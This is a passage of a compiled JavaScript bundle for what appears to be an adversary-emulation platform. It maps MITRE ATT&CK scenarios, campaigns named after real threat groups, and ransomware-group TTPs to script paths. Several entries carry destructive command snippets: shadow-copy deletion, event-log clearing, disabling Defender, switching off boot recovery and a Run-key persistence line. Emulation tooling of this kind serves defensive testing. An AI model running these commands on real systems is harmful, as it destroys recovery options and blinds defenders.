module.exports = [
"[project]/src/lib/types.ts [app-ssr] (ecmascript)", ((__turbopack_context__) => {
"use strict";

__turbopack_context__.s([
    "CAMPAIGNS",
    ()=>CAMPAIGNS,
    "SCENARIOS",
    ()=>SCENARIOS,
    "THREAT_ACTORS",
    ()=>THREAT_ACTORS
]);
const SCENARIOS = [
    {
        id: 'recon-local',
        name: 'Host Reconnaissance (PowerShell)',
        adversary: 'Red Team Ops',
        description: 'Enumerates local network connections and running processes to identify key assets.',
        mitreTechniques: [
            {
                id: 'T1049',
                name: 'System Network Connections Discovery',
                url: 'https://attack.mitre.org/techniques/T1049/'
            },
            {
                id: 'T1057',
                name: 'Process Discovery',
                url: 'https://attack.mitre.org/techniques/T1057/'
            }
        ],
        scriptPath: 'scenarios/recon_local.ps1',
        estimatedDuration: '2 mins',
        difficulty: 'Easy'
    },
    {
        id: 'priv-esc',
        name: 'Privilege Escalation Check',
        adversary: 'APT28',
        description: 'Checks current privileges and simulates enabling SeDebugPrivilege.',
        mitreTechniques: [
            {
                id: 'T1134',
                name: 'Access Token Manipulation',
                url: 'https://attack.mitre.org/techniques/T1134/'
            }
        ],
        scriptPath: 'scenarios/priv_esc.ps1',
        estimatedDuration: '1 min',
        difficulty: 'Medium'
    },
    {
        id: 'lateral-dc',
        name: 'Lateral Movement to Domain Controller',
        adversary: 'APT28',
        description: 'Attempts to verify connectivity and simulate administrative share access to the DC (10.160.37.16).',
        mitreTechniques: [
            {
                id: 'T1021.002',
                name: 'Remote Services: SMB',
                url: 'https://attack.mitre.org/techniques/T1021/002/'
            }
        ],
        scriptPath: 'scenarios/lateral_dc.ps1',
        estimatedDuration: '5 mins',
        difficulty: 'Hard'
    },
    {
        id: 'c2-check',
        name: 'C2 Connectivity Check',
        adversary: 'Scattered Spider',
        description: 'Verifies DNS resolution and TCP connectivity to the configured C2 infrastructure.',
        mitreTechniques: [
            {
                id: 'T1071',
                name: 'Application Layer Protocol',
                url: 'https://attack.mitre.org/techniques/T1071/'
            }
        ],
        scriptPath: 'scenarios/c2_check.ps1',
        estimatedDuration: '2 mins',
        difficulty: 'Easy'
    },
    {
        id: 'persistence-reg',
        name: 'Persistence (Registry)',
        adversary: 'APT1',
        description: 'Creates a simulated malicious Run key in HKCU.',
        mitreTechniques: [
            {
                id: 'T1547.001',
                name: 'Registry Run Keys',
                url: 'https://attack.mitre.org/techniques/T1547/001/'
            }
        ],
        scriptPath: 'scenarios/persistence.ps1',
        estimatedDuration: '1 min',
        difficulty: 'Medium'
    },
    {
        id: 'defense-evasion',
        name: 'Defense Evasion (Clear Logs)',
        adversary: 'Red Team Ops',
        description: 'Simulates clearing the Security Event Log.',
        mitreTechniques: [
            {
                id: 'T1070.001',
                name: 'Indicator Removal: Clear Windows Event Logs',
                url: 'https://attack.mitre.org/techniques/T1070/001/'
            }
        ],
        scriptPath: 'scenarios/defense_evasion.ps1',
        estimatedDuration: '2 mins',
        difficulty: 'Medium'
    },
    {
        id: 'cred-dump',
        name: 'Credential Dumping (Active)',
        adversary: 'APT1',
        description: 'Simulates dumping LSASS memory using rundll32 and comsvcs.dll.',
        mitreTechniques: [
            {
                id: 'T1003.001',
                name: 'OS Credential Dumping: LSASS Memory',
                url: 'https://attack.mitre.org/techniques/T1003/001/'
            }
        ],
        scriptPath: 'scenarios/cred_dump.ps1',
        estimatedDuration: '3 mins',
        difficulty: 'Hard'
    },
    {
        id: 'initial-access',
        name: 'Initial Access (Payload Staging)',
        adversary: 'APT45',
        description: 'Simulates dropping a payload (output.wav) to C:\\temp for exfiltration.',
        mitreTechniques: [
            {
                id: 'T1105',
                name: 'Ingress Tool Transfer',
                url: 'https://attack.mitre.org/techniques/T1105/'
            }
        ],
        scriptPath: 'scenarios/initial_access.ps1',
        estimatedDuration: '1 min',
        difficulty: 'Easy'
    },
    {
        id: 'exfil-dns',
        name: 'Exfiltration via DNS',
        adversary: 'APT45',
        description: 'Reads the staged payload and exfiltrates it via DNS A record queries.',
        mitreTechniques: [
            {
                id: 'T1048.003',
                name: 'Exfiltration Over Alternative Protocol: DNS',
                url: 'https://attack.mitre.org/techniques/T1048/003/'
            }
        ],
        scriptPath: 'scenarios/exfil_dns.ps1',
        estimatedDuration: '3 mins',
        difficulty: 'Hard'
    },
    // WSL-Based Scenarios
    {
        id: 'wsl-recon',
        name: 'WSL Reconnaissance & Enumeration',
        adversary: 'Red Team Ops',
        description: 'Executes Linux reconnaissance commands via WSL, accessing Windows filesystem through /mnt/c mount points.',
        mitreTechniques: [
            {
                id: 'T1202',
                name: 'Indirect Command Execution',
                url: 'https://attack.mitre.org/techniques/T1202/'
            },
            {
                id: 'T1083',
                name: 'File and Directory Discovery',
                url: 'https://attack.mitre.org/techniques/T1083/'
            }
        ],
        scriptPath: 'scenarios/wsl/wsl_recon.ps1',
        estimatedDuration: '2 mins',
        difficulty: 'Easy'
    },
    {
        id: 'wsl-defense-evasion',
        name: 'WSL Defense Evasion',
        adversary: 'Scattered Spider',
        description: 'Uses wsl.exe to execute commands, bypassing Windows command-line logging and security controls.',
        mitreTechniques: [
            {
                id: 'T1202',
                name: 'Indirect Command Execution',
                url: 'https://attack.mitre.org/techniques/T1202/'
            },
            {
                id: 'T1027',
                name: 'Obfuscated Files or Information',
                url: 'https://attack.mitre.org/techniques/T1027/'
            }
        ],
        scriptPath: 'scenarios/wsl/wsl_defense_evasion.ps1',
        estimatedDuration: '2 mins',
        difficulty: 'Medium'
    },
    {
        id: 'wsl-reverse-shell',
        name: 'WSL Reverse Shell',
        adversary: 'APT28',
        description: 'Establishes a reverse shell using bash and netcat from within WSL subsystem.',
        mitreTechniques: [
            {
                id: 'T1059.004',
                name: 'Command and Scripting Interpreter: Unix Shell',
                url: 'https://attack.mitre.org/techniques/T1059/004/'
            }
        ],
        scriptPath: 'scenarios/wsl/wsl_reverse_shell.ps1',
        estimatedDuration: '3 mins',
        difficulty: 'Hard'
    },
    {
        id: 'wsl-file-access',
        name: 'WSL File Access & Staging',
        adversary: 'APT1',
        description: 'Accesses and stages Windows files via WSL mount points for collection and exfiltration.',
        mitreTechniques: [
            {
                id: 'T1005',
                name: 'Data from Local System',
                url: 'https://attack.mitre.org/techniques/T1005/'
            },
            {
                id: 'T1074.001',
                name: 'Data Staged: Local Data Staging',
                url: 'https://attack.mitre.org/techniques/T1074/001/'
            }
        ],
        scriptPath: 'scenarios/wsl/wsl_file_access.ps1',
        estimatedDuration: '3 mins',
        difficulty: 'Medium'
    },
    {
        id: 'wsl-persistence',
        name: 'WSL Persistence (Cron)',
        adversary: 'Wizard Spider',
        description: 'Establishes persistence via cron jobs within WSL that execute when the subsystem is running.',
        mitreTechniques: [
            {
                id: 'T1053.003',
                name: 'Scheduled Task/Job: Cron',
                url: 'https://attack.mitre.org/techniques/T1053/003/'
            }
        ],
        scriptPath: 'scenarios/wsl/wsl_persistence.ps1',
        estimatedDuration: '2 mins',
        difficulty: 'Medium'
    },
    {
        id: 'wsl-exfil',
        name: 'WSL Exfiltration (curl/wget)',
        adversary: 'APT45',
        description: 'Uses Linux tools (curl, wget, netcat) from WSL to exfiltrate data to C2 server.',
        mitreTechniques: [
            {
                id: 'T1048',
                name: 'Exfiltration Over Alternative Protocol',
                url: 'https://attack.mitre.org/techniques/T1048/'
            },
            {
                id: 'T1567',
                name: 'Exfiltration Over Web Service',
                url: 'https://attack.mitre.org/techniques/T1567/'
            }
        ],
        scriptPath: 'scenarios/wsl/wsl_exfil.ps1',
        estimatedDuration: '3 mins',
        difficulty: 'Hard'
    },
    // LOLBin Download Chains
    {
        id: 'lolbin-certutil',
        name: 'LOLBin Download (certutil)',
        adversary: 'APT28',
        description: 'Uses certutil.exe to download offensive tools from C2 server, triggering LOLBin detection rules.',
        mitreTechniques: [
            {
                id: 'T1105',
                name: 'Ingress Tool Transfer',
                url: 'https://attack.mitre.org/techniques/T1105/'
            },
            {
                id: 'T1140',
                name: 'Deobfuscate/Decode Files',
                url: 'https://attack.mitre.org/techniques/T1140/'
            }
        ],
        scriptPath: 'scenarios/lolbin/certutil_download.ps1',
        estimatedDuration: '2 mins',
        difficulty: 'Easy'
    },
    {
        id: 'lolbin-bitsadmin',
        name: 'LOLBin Download (bitsadmin)',
        adversary: 'APT1',
        description: 'Creates BITS jobs to stealthily download tools from C2, disguised as Windows Update activity.',
        mitreTechniques: [
            {
                id: 'T1197',
                name: 'BITS Jobs',
                url: 'https://attack.mitre.org/techniques/T1197/'
            },
            {
                id: 'T1105',
                name: 'Ingress Tool Transfer',
                url: 'https://attack.mitre.org/techniques/T1105/'
            }
        ],
        scriptPath: 'scenarios/lolbin/bitsadmin_download.ps1',
        estimatedDuration: '3 mins',
        difficulty: 'Medium'
    },
    {
        id: 'lolbin-mshta',
        name: 'LOLBin Execution (mshta)',
        adversary: 'Wizard Spider',
        description: 'Uses mshta.exe for signed binary proxy execution of HTA payloads with embedded VBScript.',
        mitreTechniques: [
            {
                id: 'T1218.005',
                name: 'Signed Binary Proxy Execution: Mshta',
                url: 'https://attack.mitre.org/techniques/T1218/005/'
            }
        ],
        scriptPath: 'scenarios/lolbin/mshta_execute.ps1',
        estimatedDuration: '2 mins',
        difficulty: 'Medium'
    },
    {
        id: 'lolbin-powershell-cradle',
        name: 'PowerShell Download Cradles',
        adversary: 'Scattered Spider',
        description: 'Demonstrates multiple PowerShell download methods: IWR, WebClient, DownloadString, and BITS Transfer.',
        mitreTechniques: [
            {
                id: 'T1059.001',
                name: 'PowerShell',
                url: 'https://attack.mitre.org/techniques/T1059/001/'
            },
            {
                id: 'T1105',
                name: 'Ingress Tool Transfer',
                url: 'https://attack.mitre.org/techniques/T1105/'
            }
        ],
        scriptPath: 'scenarios/lolbin/powershell_download.ps1',
        estimatedDuration: '2 mins',
        difficulty: 'Easy'
    },
    // Credential Access
    {
        id: 'cred-mimikatz',
        name: 'Mimikatz Credential Dump',
        adversary: 'APT28',
        description: 'Downloads and executes Mimikatz for sekurlsa::logonpasswords, lsadump::cache, and Kerberos ticket extraction.',
        mitreTechniques: [
            {
                id: 'T1003.001',
                name: 'OS Credential Dumping: LSASS Memory',
                url: 'https://attack.mitre.org/techniques/T1003/001/'
            },
            {
                id: 'T1003.003',
                name: 'OS Credential Dumping: NTDS',
                url: 'https://attack.mitre.org/techniques/T1003/003/'
            }
        ],
        scriptPath: 'scenarios/credential_access/mimikatz_dump.ps1',
        estimatedDuration: '5 mins',
        difficulty: 'Hard'
    },
    {
        id: 'cred-comsvcs-lsass',
        name: 'LSASS Dump (comsvcs.dll)',
        adversary: 'Red Team Ops',
        description: 'Uses native comsvcs.dll MiniDump via rundll32 to dump LSASS memory - no external tools required.',
        mitreTechniques: [
            {
                id: 'T1003.001',
                name: 'OS Credential Dumping: LSASS Memory',
                url: 'https://attack.mitre.org/techniques/T1003/001/'
            }
        ],
        scriptPath: 'scenarios/credential_access/comsvcs_lsass.ps1',
        estimatedDuration: '3 mins',
        difficulty: 'Medium'
    },
    {
        id: 'cred-sam-extract',
        name: 'SAM/SYSTEM Registry Extraction',
        adversary: 'APT1',
        description: 'Extracts SAM, SYSTEM, and SECURITY registry hives for offline credential cracking with secretsdump.',
        mitreTechniques: [
            {
                id: 'T1003.002',
                name: 'OS Credential Dumping: SAM',
                url: 'https://attack.mitre.org/techniques/T1003/002/'
            }
        ],
        scriptPath: 'scenarios/credential_access/sam_extract.ps1',
        estimatedDuration: '2 mins',
        difficulty: 'Medium'
    },
    {
        id: 'cred-procdump-lsass',
        name: 'LSASS Dump (Procdump)',
        adversary: 'APT45',
        description: 'Uses Microsoft-signed Sysinternals Procdump to create a full memory dump of LSASS process.',
        mitreTechniques: [
            {
                id: 'T1003.001',
                name: 'OS Credential Dumping: LSASS Memory',
                url: 'https://attack.mitre.org/techniques/T1003/001/'
            },
            {
                id: 'T1105',
                name: 'Ingress Tool Transfer',
                url: 'https://attack.mitre.org/techniques/T1105/'
            }
        ],
        scriptPath: 'scenarios/credential_access/procdump_lsass.ps1',
        estimatedDuration: '3 mins',
        difficulty: 'Hard'
    },
    // Lateral Movement
    {
        id: 'lateral-psexec',
        name: 'PsExec Remote Execution',
        adversary: 'APT28',
        description: 'Downloads PsExec and executes commands remotely via SMB service creation (PSEXESVC).',
        mitreTechniques: [
            {
                id: 'T1569.002',
                name: 'System Services: Service Execution',
                url: 'https://attack.mitre.org/techniques/T1569/002/'
            },
            {
                id: 'T1021.002',
                name: 'Remote Services: SMB',
                url: 'https://attack.mitre.org/techniques/T1021/002/'
            }
        ],
        scriptPath: 'scenarios/lateral_movement/psexec_remote.ps1',
        estimatedDuration: '5 mins',
        difficulty: 'Hard'
    },
    {
        id: 'lateral-wmi',
        name: 'WMI Remote Execution',
        adversary: 'Red Team Ops',
        description: 'Uses native WMI for remote process creation and system enumeration - no external tools needed.',
        mitreTechniques: [
            {
                id: 'T1047',
                name: 'Windows Management Instrumentation',
                url: 'https://attack.mitre.org/techniques/T1047/'
            }
        ],
        scriptPath: 'scenarios/lateral_movement/wmiexec_remote.ps1',
        estimatedDuration: '3 mins',
        difficulty: 'Medium'
    },
    {
        id: 'lateral-pth',
        name: 'Pass-the-Hash Attack',
        adversary: 'Scattered Spider',
        description: 'Uses Mimikatz sekurlsa::pth to authenticate with extracted NTLM hashes for lateral movement.',
        mitreTechniques: [
            {
                id: 'T1550.002',
                name: 'Pass the Hash',
                url: 'https://attack.mitre.org/techniques/T1550/002/'
            },
            {
                id: 'T1003.001',
                name: 'OS Credential Dumping: LSASS Memory',
                url: 'https://attack.mitre.org/techniques/T1003/001/'
            }
        ],
        scriptPath: 'scenarios/lateral_movement/pth_attack.ps1',
        estimatedDuration: '5 mins',
        difficulty: 'Hard'
    },
    {
        id: 'lateral-smb',
        name: 'SMB Admin Share Lateral',
        adversary: 'Wizard Spider',
        description: 'Accesses C$/ADMIN$ shares, copies payloads, and schedules remote execution via schtasks.',
        mitreTechniques: [
            {
                id: 'T1021.002',
                name: 'Remote Services: SMB',
                url: 'https://attack.mitre.org/techniques/T1021/002/'
            },
            {
                id: 'T1570',
                name: 'Lateral Tool Transfer',
                url: 'https://attack.mitre.org/techniques/T1570/'
            },
            {
                id: 'T1053.005',
                name: 'Scheduled Task',
                url: 'https://attack.mitre.org/techniques/T1053/005/'
            }
        ],
        scriptPath: 'scenarios/lateral_movement/smb_lateral.ps1',
        estimatedDuration: '5 mins',
        difficulty: 'Hard'
    },
    // BYOVD - EDR Bypass
    {
        id: 'byovd-rtcore',
        name: 'BYOVD: RTCore64 EDR Kill',
        adversary: 'Wizard Spider',
        description: 'Loads vulnerable MSI Afterburner driver (CVE-2019-16098) for kernel-level EDR callback removal.',
        mitreTechniques: [
            {
                id: 'T1562.001',
                name: 'Impair Defenses: Disable or Modify Tools',
                url: 'https://attack.mitre.org/techniques/T1562/001/'
            },
            {
                id: 'T1068',
                name: 'Exploitation for Privilege Escalation',
                url: 'https://attack.mitre.org/techniques/T1068/'
            }
        ],
        scriptPath: 'scenarios/byovd/byovd_rtcore.ps1',
        estimatedDuration: '5 mins',
        difficulty: 'Hard'
    },
    {
        id: 'byovd-dbutil',
        name: 'BYOVD: Dell dbutil Exploit',
        adversary: 'APT45',
        description: 'Uses Dell dbutil_2_3.sys (CVE-2021-21551) for kernel R/W - attributed to Lazarus APT group.',
        mitreTechniques: [
            {
                id: 'T1562.001',
                name: 'Impair Defenses: Disable or Modify Tools',
                url: 'https://attack.mitre.org/techniques/T1562/001/'
            },
            {
                id: 'T1068',
                name: 'Exploitation for Privilege Escalation',
                url: 'https://attack.mitre.org/techniques/T1068/'
            }
        ],
        scriptPath: 'scenarios/byovd/byovd_dbutil.ps1',
        estimatedDuration: '5 mins',
        difficulty: 'Hard'
    },
    {
        id: 'byovd-terminator',
        name: 'Terminator EDR Kill',
        adversary: 'Scattered Spider',
        description: 'Uses Terminator BYOVD tool to enumerate and terminate EDR processes via signed kernel driver abuse.',
        mitreTechniques: [
            {
                id: 'T1562.001',
                name: 'Impair Defenses: Disable or Modify Tools',
                url: 'https://attack.mitre.org/techniques/T1562/001/'
            },
            {
                id: 'T1518.001',
                name: 'Security Software Discovery',
                url: 'https://attack.mitre.org/techniques/T1518/001/'
            }
        ],
        scriptPath: 'scenarios/byovd/terminator_edr.ps1',
        estimatedDuration: '3 mins',
        difficulty: 'Hard'
    },
    {
        id: 'edr-process-kill',
        name: 'Multi-Method EDR Disable',
        adversary: 'Red Team Ops',
        description: 'Attempts to disable EDR via PowerShell, service stops, taskkill, registry, and AMSI bypass.',
        mitreTechniques: [
            {
                id: 'T1562.001',
                name: 'Impair Defenses: Disable or Modify Tools',
                url: 'https://attack.mitre.org/techniques/T1562/001/'
            },
            {
                id: 'T1518.001',
                name: 'Security Software Discovery',
                url: 'https://attack.mitre.org/techniques/T1518/001/'
            }
        ],
        scriptPath: 'scenarios/byovd/edr_process_kill.ps1',
        estimatedDuration: '3 mins',
        difficulty: 'Medium'
    }
];
const CAMPAIGNS = [
    {
        id: 'full-killchain-campaign',
        adversary: 'Red Team Ops',
        name: 'Full Killchain Emulation',
        description: 'A complete end-to-end simulation from Initial Access to Exfiltration.',
        steps: [
            'initial-access',
            'persistence-reg',
            'priv-esc',
            'defense-evasion',
            'lateral-dc',
            'c2-check',
            'exfil-dns'
        ]
    },
    {
        id: 'apt28-campaign',
        adversary: 'APT28',
        name: 'Operation XAgent',
        description: 'Simulates a typical APT28 intrusion chain involving recon, privilege escalation, and lateral movement targeting high-value infrastructure.',
        steps: [
            'recon-local',
            'priv-esc',
            'lateral-dc',
            'cred-dump'
        ] // Example chain
    },
    {
        id: 'apt1-campaign',
        adversary: 'APT1',
        name: 'Operation Comment Crew',
        description: 'A noise-heavy campaign focusing on persistence and credential harvesting.',
        steps: [
            'recon-local',
            'persistence-reg',
            'cred-dump'
        ]
    },
    {
        id: 'scattered-spider-campaign',
        adversary: 'Scattered Spider',
        name: 'Cloud & Identity Siege',
        description: 'Focuses on connecting to C2, evading defenses, and establishing persistence for long-term access.',
        steps: [
            'c2-check',
            'defense-evasion',
            'persistence-reg',
            'priv-esc'
        ]
    },
    {
        id: 'apt45-campaign',
        adversary: 'APT45',
        name: 'North Korean Info Stealer',
        description: 'Rapid collection of information and credentials.',
        steps: [
            'recon-local',
            'defense-evasion',
            'cred-dump'
        ]
    },
    {
        id: 'mustang-panda-campaign',
        adversary: 'Mustang Panda',
        name: 'PlugX Propagation',
        description: 'Lateral movement and C2 beaconing focus.',
        steps: [
            'recon-local',
            'lateral-dc',
            'c2-check'
        ]
    },
    {
        id: 'wizard-spider-campaign',
        adversary: 'Wizard Spider',
        name: 'Conti/Ryuk Precursor',
        description: 'The prelude to a ransomware attack: Recon, C2 verification, and spreading via SMB.',
        steps: [
            'recon-local',
            'c2-check',
            'lateral-dc',
            'defense-evasion'
        ]
    },
    // WSL-Focused Campaign
    {
        id: 'wsl-threat-campaign',
        adversary: 'Scattered Spider',
        name: 'WSL Subsystem Exploitation',
        description: 'Leverages Windows Subsystem for Linux to bypass security controls, establish persistence, and exfiltrate data using native Linux tooling.',
        steps: [
            'wsl-recon',
            'wsl-defense-evasion',
            'wsl-file-access',
            'wsl-persistence',
            'wsl-exfil'
        ]
    },
    // Advanced Campaigns
    {
        id: 'ransomware-precursor-campaign',
        adversary: 'Wizard Spider',
        name: 'Ransomware Precursor Chain',
        description: 'Full ransomware preparation chain: LOLBin tool staging, credential harvesting with Mimikatz, lateral movement via PsExec, and EDR termination via BYOVD.',
        steps: [
            'lolbin-certutil',
            'cred-mimikatz',
            'lateral-psexec',
            'byovd-terminator'
        ]
    },
    {
        id: 'apt-fullchain-campaign',
        adversary: 'APT28',
        name: 'APT Full Intrusion Chain',
        description: 'Sophisticated APT attack: stealthy BITS download, LSASS credential dump, WMI lateral movement, and kernel-level EDR bypass via vulnerable driver.',
        steps: [
            'lolbin-bitsadmin',
            'cred-procdump-lsass',
            'lateral-wmi',
            'lateral-pth',
            'byovd-rtcore'
        ]
    }
];
const THREAT_ACTORS = [
    {
        id: 'lockbit',
        name: 'LockBit 3.0',
        aliases: [
            'LockBit Black'
        ],
        description: 'One of the most prolific RaaS groups. LockBit 3.0 uses a modular ransomware payload and extensive living-off-the-land techniques.',
        ttps: [
            {
                id: 'T1047',
                technique: 'Windows Management Instrumentation',
                tactic: 'Execution',
                description: 'Uses WMI to delete Volume Shadow Copies to prevent recovery.',
                commandSnippet: 'Get-WmiObject Win32_Shadowcopy | ForEach-Object { $_.Delete() }',
                scriptPath: 'scenarios/lockbit/wmi_shadowcopy.ps1'
            },
            {
                id: 'T1070.001',
                technique: 'Indicator Removal: Clear Windows Event Logs',
                tactic: 'Defense Evasion',
                description: 'Clears security, system, and application logs to hide activity.',
                commandSnippet: 'wevtutil cl Security; wevtutil cl System; wevtutil cl Application',
                scriptPath: 'scenarios/lockbit/log_clear.ps1'
            },
            {
                id: 'T1112',
                technique: 'Modify Registry',
                tactic: 'Defense Evasion',
                description: 'Modifies registry to disable Windows Defender defenses.',
                commandSnippet: 'Set-MpPreference -DisableRealtimeMonitoring $true',
                scriptPath: 'scenarios/lockbit/disable_defender.ps1',
                revertScriptPath: 'scenarios/lockbit/disable_defender_revert.ps1'
            },
            {
                id: 'T1490',
                technique: 'Inhibit System Recovery',
                tactic: 'Impact',
                description: 'Disables boot recovery options using bcdedit.',
                commandSnippet: 'bcdedit /set {default} recoveryenabled No',
                scriptPath: 'scenarios/lockbit/bcdedit_recovery.ps1',
                revertScriptPath: 'scenarios/lockbit/bcdedit_recovery_revert.ps1'
            }
        ]
    },
    {
        id: 'generic-discovery',
        name: 'Generic Discovery Modules',
        aliases: [
            'Red Team Ops',
            'Manual Recon'
        ],
        description: 'Common discovery commands used by various threat actors to enumerate the environment.',
        ttps: [
            {
                id: 'T1016',
                technique: 'System Network Configuration Discovery',
                tactic: 'Discovery',
                description: 'Enumerates network interfaces and IP configurations.',
                commandSnippet: 'ipconfig /all',
                scriptPath: 'scenarios/library/discovery_network.ps1'
            },
            {
                id: 'T1069',
                technique: 'Permission Groups Discovery',
                tactic: 'Discovery',
                description: 'Enumerates domain groups and members.',
                commandSnippet: 'net group /domain "Domain Admins"',
                scriptPath: 'scenarios/library/discovery_groups.ps1'
            },
            {
                id: 'T1033',
                technique: 'System Owner/User Discovery',
                tactic: 'Discovery',
                description: 'Identifies the current user context.',
                commandSnippet: 'whoami /all',
                scriptPath: 'scenarios/library/discovery_user.ps1'
            },
            {
                id: 'T1087',
                technique: 'Account Discovery',
                tactic: 'Discovery',
                description: 'Enumerates all users in the domain.',
                commandSnippet: 'Get-ADUser -Filter * | Select-Object Name,SamAccountName',
                scriptPath: 'scenarios/library/discovery_ad_users.ps1'
            }
        ]
    },
    {
        id: 'blackbasta',
        name: 'Black Basta',
        aliases: [
            'Black Basta Syndicate'
        ],
        description: 'Emerged in 2022 as a potent RaaS. Known for spearphishing, Qakbot distribution, and using Backstab to disable EDR.',
        ttps: [
            {
                id: 'T1566',
                technique: 'Phishing',
                tactic: 'Initial Access',
                description: 'Uses spearphishing emails with malicious ZIP attachments.',
                commandSnippet: '# Simulated phishing delivery',
                scriptPath: 'scenarios/blackbasta/phishing_sim.ps1'
            },
            {
                id: 'T1562.001',
                technique: 'Impair Defenses: Disable or Modify Tools',
                tactic: 'Defense Evasion',
                description: 'Uses Backstab tool to disable EDR products.',
                commandSnippet: 'Stop-Service -Name "Sense" -Force',
                scriptPath: 'scenarios/blackbasta/disable_edr.ps1',
                revertScriptPath: 'scenarios/blackbasta/disable_edr_revert.ps1'
            },
            {
                id: 'T1068',
                technique: 'Exploitation for Privilege Escalation',
                tactic: 'Privilege Escalation',
                description: 'Uses exploits like Zerologon, NoPac, PrintNightmare.',
                commandSnippet: '# Invoke-ZeroLogon simulation',
                scriptPath: 'scenarios/blackbasta/priv_esc_exploit.ps1'
            },
            {
                id: 'T1021.001',
                technique: 'Remote Services: RDP',
                tactic: 'Lateral Movement',
                description: 'Uses valid accounts for RDP access.',
                commandSnippet: 'mstsc /v:<TARGET_IP>',
                scriptPath: 'scenarios/blackbasta/rdp_lateral.ps1',
                inputParams: [
                    {
                        name: 'TargetIP',
                        label: 'Target IP Address',
                        type: 'ip',
                        placeholder: '10.0.0.1',
                        required: true
                    }
                ]
            }
        ]
    },
    {
        id: 'alphv',
        name: 'ALPHV / BlackCat',
        aliases: [
            'ALPHV',
            'BlackCat',
            'Noberus'
        ],
        description: 'First major ransomware written in Rust. Highly customizable with multiple extortion methods.',
        ttps: [
            {
                id: 'T1078',
                technique: 'Valid Accounts',
                tactic: 'Initial Access',
                description: 'Uses ProxyShell vulnerabilities for initial access.',
                commandSnippet: '# ProxyShell exploitation simulation',
                scriptPath: 'scenarios/alphv/proxyshell_sim.ps1'
            },
            {
                id: 'T1059.001',
                technique: 'PowerShell',
                tactic: 'Execution',
                description: 'Uses PowerShell to delete shadow copies and clear logs.',
                commandSnippet: 'Get-WmiObject Win32_Shadowcopy | Remove-WmiObject',
                scriptPath: 'scenarios/alphv/ps_execution.ps1'
            },
            {
                id: 'T1053',
                technique: 'Scheduled Task/Job',
                tactic: 'Execution',
                description: 'Creates scheduled tasks to deploy ransomware via GPO.',
                commandSnippet: 'schtasks /create /sc once /tn "Update" /tr "C:\\payload.exe" /st 00:00',
                scriptPath: 'scenarios/alphv/schtask_create.ps1',
                revertScriptPath: 'scenarios/alphv/schtask_create_revert.ps1'
            }
        ]
    },
    {
        id: 'avoslocker',
        name: 'AvosLocker',
        aliases: [
            'Avos',
            'AvosLocker RaaS'
        ],
        description: 'RaaS known for exploiting public-facing applications and using legitimate remote access tools.',
        ttps: [
            {
                id: 'T1190',
                technique: 'Exploit Public-Facing Application',
                tactic: 'Initial Access',
                description: 'Exploits vulnerable web applications for entry.',
                commandSnippet: '# Web exploit simulation',
                scriptPath: 'scenarios/avoslocker/webexploit_sim.ps1'
            },
            {
                id: 'T1490',
                technique: 'Inhibit System Recovery',
                tactic: 'Impact',
                description: 'Deletes shadow copies to prevent recovery.',
                commandSnippet: 'vssadmin delete shadows /all /quiet',
                scriptPath: 'scenarios/avoslocker/delete_shadows.ps1'
            },
            {
                id: 'T1219',
                technique: 'Remote Access Tools',
                tactic: 'Command and Control',
                description: 'Uses tools like AnyDesk or TeamViewer for persistence.',
                commandSnippet: 'Start-Process "C:\\AnyDesk\\AnyDesk.exe" -ArgumentList "--start-service"',
                scriptPath: 'scenarios/avoslocker/rat_install.ps1',
                inputParams: [
                    {
                        name: 'C2URL',
                        label: 'C2 Server URL',
                        type: 'url',
                        placeholder: 'http://10.0.0.1:443/beacon',
                        required: true
                    }
                ]
            },
            {
                id: 'T1486',
                technique: 'Data Encrypted for Impact',
                tactic: 'Impact',
                description: 'Encrypts victim data to demand ransom.',
                commandSnippet: '# Encryption simulation (safe mode)',
                scriptPath: 'scenarios/avoslocker/encrypt_sim.ps1'
            }
        ]
    },
    {
        id: 'bianlian',
        name: 'BianLian',
        aliases: [
            'BianLian Gang'
        ],
        description: 'Go-based ransomware known for sandbox evasion and spreading via removable media.',
        ttps: [
            {
                id: 'T1497',
                technique: 'Virtualization/Sandbox Evasion',
                tactic: 'Defense Evasion',
                description: 'Detects and avoids virtualization environments.',
                commandSnippet: 'Get-WmiObject Win32_ComputerSystem | Select-Object Manufacturer',
                scriptPath: 'scenarios/bianlian/vm_detect.ps1'
            },
            {
                id: 'T1027.002',
                technique: 'Software Packing',
                tactic: 'Defense Evasion',
                description: 'Uses software packing to conceal code.',
                commandSnippet: '# Packed payload simulation',
                scriptPath: 'scenarios/bianlian/packed_payload.ps1'
            },
            {
                id: 'T1091',
                technique: 'Replication Through Removable Media',
                tactic: 'Lateral Movement',
                description: 'Spreads via USB and autorun.',
                commandSnippet: 'Get-WmiObject Win32_LogicalDisk -Filter "DriveType=2"',
                scriptPath: 'scenarios/bianlian/usb_spread.ps1'
            },
            {
                id: 'T1486',
                technique: 'Data Encrypted for Impact',
                tactic: 'Impact',
                description: 'Encrypts data for extortion.',
                commandSnippet: '# Encryption simulation (safe mode)',
                scriptPath: 'scenarios/bianlian/encrypt_sim.ps1',
                revertScriptPath: 'scenarios/bianlian/encrypt_sim_revert.ps1'
            }
        ]
    },
    {
        id: 'clop',
        name: 'Cl0p',
        aliases: [
            'Cl0p',
            'TA505',
            'FIN11'
        ],
        description: 'Notorious for exploiting zero-days (MOVEit, Accellion FTA) and large-scale data theft.',
        ttps: [
            {
                id: 'T1190',
                technique: 'Exploit Public-Facing Application',
                tactic: 'Initial Access',
                description: 'Exploits CVEs like MOVEit (CVE-2023-34362).',
                commandSnippet: '# MOVEit exploit simulation',
                scriptPath: 'scenarios/clop/moveit_exploit.ps1'
            },
            {
                id: 'T1547',
                technique: 'Boot or Logon Autostart Execution',
                tactic: 'Persistence',
                description: 'Creates registry run entries for persistence.',
                commandSnippet: 'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Update" -Value "C:\\payload.exe"',
                scriptPath: 'scenarios/clop/registry_persist.ps1',
                revertScriptPath: 'scenarios/clop/registry_persist_revert.ps1'
            },
            {
                id: 'T1070.001',
                technique: 'Clear Windows Event Logs',
                tactic: 'Defense Evasion',
                description: 'Clears event logs to hide activity.',
                commandSnippet: 'wevtutil cl Security; wevtutil cl System',
                scriptPath: 'scenarios/clop/log_clear.ps1'
            },
            {
                id: 'T1567',
                technique: 'Exfiltration Over Web Service',
                tactic: 'Exfiltration',
                description: 'Exfiltrates data via DEWMODE webshell.',
                commandSnippet: '# Webshell exfil simulation',
                scriptPath: 'scenarios/clop/webshell_exfil.ps1'
            }
        ]
    },
    {
        id: 'conti',
        name: 'Conti',
        aliases: [
            'Conti Team',
            'Wizard Spider'
